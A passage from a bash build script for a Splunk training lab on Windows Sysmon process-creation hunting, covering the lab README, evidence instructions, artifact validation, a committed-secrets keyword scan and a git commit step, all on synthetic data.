Investigate Windows process creation telemetry using Sysmon-style Event ID 1 records and Splunk SPL.

The lab focuses on:

- Process creation
- Parent → child relationships
- PowerShell activity
- Command-line analysis
- Suspicious execution chains
- Timeline reconstruction
- Detection-oriented SPL
- SOC evidence and reporting

## Relationship to Splunk Lab 01

This lab builds directly on:

**Lab 01 — SSH Authentication Threat Hunting**

Lab 01 established source/account analysis, authentication correlation and timeline reconstruction.

Lab 02 extends the same methodology into endpoint telemetry:

\`Authentication → Endpoint → Process → Detection → Investigation\`

See:

\`../Lab-01-SSH-Authentication-Hunting/README.md\`

for the preceding investigation.

## Dataset

\`data/sysmon_process_creation.csv\`

The dataset contains synthetic Sysmon Event ID 1-style records.

## Execution status

- [x] Synthetic Sysmon dataset generated
- [x] Dedicated Splunk index configured
- [x] Dataset ingested
- [x] Process creation investigation executed
- [x] Parent/child analysis executed
- [x] PowerShell investigation executed
- [x] Suspicious command-line analysis executed
- [x] Detection-oriented SPL created
- [x] Investigation report generated
- [x] Dashboard definition generated
- [x] Dashboard REST validation attempted
- [ ] SOC monitoring dashboard screenshot captured

> The screenshot checkbox must remain unchecked until the dashboard is visually opened and genuinely captured.

## Evidence

See:

\`evidence/README.md\`

## Main artifacts

- \`spl/process-investigation.spl\`
- \`spl/detection-rules.spl\`
- \`reports/SOC-Investigation-Report.md\`
- \`dashboard/SOC-Windows-Sysmon-Process-Investigation.md\`
- \`dashboard/dashboard-studio.json\`

## Safety

No real customer, employer, credential, private infrastructure or production telemetry is used.
EOF

    cat > "$EVIDENCE_DIR/README.md" <<EOF
# Lab 02 Evidence

## Required screenshot

After verifying the dashboard in the local Splunk UI, capture the complete rendered dashboard and save it as:

\`01-soc-windows-sysmon-process-investigation-dashboard.png\`

Place it in this directory.

Then update the Lab 02 README:

\`[ ] SOC monitoring dashboard screenshot captured\`

to:

\`[x] SOC monitoring dashboard screenshot captured\`

## Evidence standard

The screenshot must show the actual Splunk dashboard rendered from the indexed synthetic dataset.

Do not create a synthetic image that imitates Splunk.

## Sanitization

Do not commit passwords, tokens, session cookies, real customer data, employer telemetry or private infrastructure information.
EOF
}

validate_artifacts() {
    log "Running artifact validation."

    [[ -s "$DATA_DIR/sysmon_process_creation.csv" ]]
    [[ -s "$SPL_DIR/process-investigation.spl" ]]
    [[ -s "$SPL_DIR/detection-rules.spl" ]]
    [[ -s "$REPORT_DIR/SOC-Investigation-Report.md" ]]
    [[ -s "$DASH_DIR/dashboard-studio.json" ]]
    [[ -s "$DASH_DIR/SOC-Windows-Sysmon-Process-Investigation.md" ]]
    [[ -s "$EVIDENCE_DIR/README.md" ]]

    python3 - "$DASH_DIR/dashboard-studio.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
assert len(d["visualizations"]) == 7
assert len(d["dataSources"]) == 7
assert len(d["layout"]["tabs"]["items"]) == 1
assert len(d["layout"]["layoutDefinitions"]["layout_1"]["structure"]) == 7
print("Dashboard JSON schema-level structure: PASS")
PY

    if grep -RniE 'password|secret|token|api[_-]?key' "$LAB_ROOT" \
        --exclude='*.png' --exclude='*.pdf' --exclude='*.md' >/tmp/lab02-secret-scan.txt; then
        warn "Potential sensitive keywords found. Review /tmp/lab02-secret-scan.txt before commit."
    else
        log "Basic sensitive-keyword scan: PASS"
    fi

    log "Artifact validation passed."
}

git_prepare() {
    log "Preparing Git changes."

    git -C "$REPO_ROOT" status --short

    # Safety: show exactly what would be committed.
    git -C "$REPO_ROOT" add "$LAB_ROOT"

    log "Staged Lab 02 files:"
    git -C "$REPO_ROOT" diff --cached --stat

    if git -C "$REPO_ROOT" diff --cached --quiet; then
        log "No new Git changes to commit."
        return
    fi

    git -C "$REPO_ROOT" commit -m "Add Splunk Lab 02 Windows Sysmon process investigation"

    if [[ "${PUSH_BRANCH:-0}" == "1" ]]; then
        git -C "$REPO_ROOT" push -u origin "$BRANCH"
        log "Pushed branch: $BRANCH"
    else
        log "Commit created locally. PUSH_BRANCH is not enabled; no push performed."
        log "To push later: git push -u origin $BRANCH"
    fi
}

main() {
    preflight
    prepare_branch
    write_synthetic_data
    configure_splunk
    import_data
    write_spl
    run_queries
    write_dashboard
    install_dashboard
    write_report_and_readme
    validate_artifacts
    git_prepare

    cat <<EOF

============================================================
SPLUNK LAB 02 BUILD COMPLETE
============================================================

Lab:
  $LAB_ROOT

Index:
  $INDEX

Sourcetype:
  $SOURCETYPE

Dashboard:
  $SPLUNK_WEB_URL/en-US/app/search/$DASHBOARD_ID

Branch:
  $BRANCH

IMPORTANT:
  The dashboard screenshot is intentionally NOT marked complete.
  Open the dashboard, verify the rendered panels, capture the real
  screenshot, save it as:

  $EVIDENCE_DIR/01-soc-windows-sysmon-process-investigation-dashboard.png

Then update the README checkbox and commit that evidence.

The script did NOT delete or modify Lab 01 data.
============================================================
EOF
}

main "$@"
